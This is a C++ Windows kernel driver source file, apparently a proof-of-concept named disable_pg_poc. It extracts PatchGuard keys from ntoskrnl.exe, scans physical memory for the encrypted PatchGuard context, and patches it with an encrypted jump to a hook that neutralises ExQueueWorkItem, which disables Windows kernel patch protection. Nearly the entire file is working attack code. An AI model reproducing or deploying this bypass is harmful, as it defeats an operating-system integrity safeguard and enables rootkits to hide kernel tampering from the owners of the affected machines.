#include "stdafx.h"

namespace ddk::patchguard
{
	DWORD64 PreKey1 = 0x4808588948c48b48ull;
	DWORD64 PreKey2 = 0x5518788948107089ull;
	DWORD64 Key1 = 0;
	DWORD64 Key2 = 0;
	ULONG_PTR g_ExQueueWorkItem = 0;
	void get_key()
	{
		PVOID lpNtMem = nullptr;
		auto st = ddk::util::LoadFileToMem(L"\\SystemRoot\\System32\\ntoskrnl.exe", &lpNtMem);
		if (!NT_SUCCESS(st))
		{
			return;
		}
		if (!lpNtMem)
		{
			return;
		}
		auto exit1 = std::experimental::make_scope_exit([&]() {
			if (lpNtMem)
			{
				ExFreePool(lpNtMem);
			}
		});
		//找到节表INITKDBG
		
		auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(lpNtMem);
		auto pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>((PUCHAR)lpNtMem + dos_header->e_lfanew);
		auto NumSections = pNtHeader->FileHeader.NumberOfSections;
		auto pSections = IMAGE_FIRST_SECTION(pNtHeader);
		auto pScan = (PUCHAR)nullptr;
		auto ScanSize = 0;
		for (auto i=0;i<NumSections;i++)
		{
			if (memcmp(pSections[i].Name, "INITKDBG", 8) == 0)
			{
				pScan = (PUCHAR)lpNtMem + pSections[i].VirtualAddress;
				ScanSize = max(pSections[i].SizeOfRawData, \
					pSections[i].Misc.VirtualSize);
				break;
			}
		}
		//找key1，key2
		if (pScan)
		{
			for (auto i=0;i<ScanSize;i++)
			{
				if (*(DWORD64 *)(&pScan[i]) == PreKey1
					&&*(DWORD64 *)(&pScan[i + 8]) == PreKey2)
				{
					Key1 = *(DWORD64 *)(&pScan[i + 0x800]);
					Key2 = *(DWORD64 *)(&pScan[i + 0x800 + 8]);
					break;
				}
			}
		}
	}
	VOID
		NewExQueueWorkItem(
			_Inout_ __drv_aliasesMem PWORK_QUEUE_ITEM WorkItem,
			_In_ WORK_QUEUE_TYPE QueueType
		)
	{
		return;
	}
	ULONG_PTR NewExecPatchGuard(ULONG_PTR Unuse, ULONG_PTR Context)
	{
		for (auto i = 0x0E8; i < 0x120; i += 8)
		{
			if (*(ULONG_PTR*)(Context + i) == g_ExQueueWorkItem)
			{
				*(ULONG_PTR*)(Context + i) = (ULONG_PTR)NewExQueueWorkItem;
				break;
			}
		}
		return Context;
	}
	void PocScanPg(PVOID BaseAddress, SIZE_T _Size)
	{
		for (auto i = SIZE_T(0); i < _Size; i++)
		{
			//下面找密文pg
			if ((i + 0x800 + 0x10) < _Size)
			{
				auto TempKey1 = *(ULONG_PTR*)((PUCHAR)BaseAddress + i) ^ PreKey1;
				auto TempKey2 = *(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x8) ^ PreKey2;
				if ((*(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x800) ^ Key1) == TempKey1 &&
					(*(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x800 + 0x8) ^ Key2) == TempKey2)
				{
					LOG_DEBUG("ExecPatchGuard address:%p    TempKey1:%p    TempKey2:%p\n", (PUCHAR)BaseAddress + i, TempKey1, TempKey2);
					UCHAR Code[0x10] = { 0 };
					memcpy(Code, "\x48\xB8\x21\x43\x65\x87\x78\x56\x34\x12\xFF\xE0\x90\x90\x90\x90", 0x10);
					*(ULONG_PTR*)(Code + 0x2) = (ULONG_PTR)NewExecPatchGuard;
					*(ULONG_PTR*)((PUCHAR)BaseAddress + i) = *(ULONG_PTR*)Code ^ TempKey1;
					*(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x8) = *(ULONG_PTR*)(Code + 0x8) ^ TempKey2;
				}
			}
		}
	}
	void disable_pg_poc()
	{
		if (!Key1||!Key2)
		{
			get_key();
		}
		if (!Key1||!Key2)
		{
			LOG_DEBUG("Find Key Failed\r\n");
			return;
		}
		LOG_DEBUG("Key1=%p Key2=%p\r\n", Key1, Key2);
		g_ExQueueWorkItem = (ULONG_PTR)ddk::util::get_proc_address("ExQueueWorkItem");
		auto PhysicalMemoryBlock = std::experimental::make_unique_resource(
			MmGetPhysicalMemoryRanges(), &ExFreePool);
		auto phymem = PhysicalMemoryBlock.get();
		if (!phymem)
		{
			return;
		}
		auto i = 0;
		while (phymem[i].NumberOfBytes.QuadPart != 0)
		{
			PHYSICAL_ADDRESS BaseAddress = PhysicalMemoryBlock[i].BaseAddress;
			LARGE_INTEGER NumberOfBytes = PhysicalMemoryBlock[i].NumberOfBytes;
			while (NumberOfBytes.QuadPart > 0)
			{
				auto MapAddress = MmGetVirtualForPhysical(BaseAddress);
				auto ulAddress = reinterpret_cast<ULONG_PTR>(MapAddress);
				SIZE_T ScanSize = PAGE_SIZE;
				if (MapAddress
					&& ulAddress > (ULONG_PTR)MmSystemRangeStart)
				{
					PVOID ImageBase = nullptr;
					if (ddk::mem_util::MmIsExecutableAddress(MapAddress))
					{
						RtlPcToFileHeader(MapAddress, &ImageBase);
						if (!ImageBase)
						{
							//发现无模块的可执行内存，扫特征日BB	
							auto pde = ddk::mem_util::UtilpAddressToPde(MapAddress);
							auto pte = ddk::mem_util::UtilpAddressToPte(MapAddress);
							if (pde->LargePage)
							{
								ScanSize = 0x200000ui64;
							}
							PocScanPg(MapAddress, ScanSize);
						}
					}
				}
				BaseAddress.QuadPart += ScanSize;
				NumberOfBytes.QuadPart -= ScanSize;
			}
			i++;
		}
	}
}
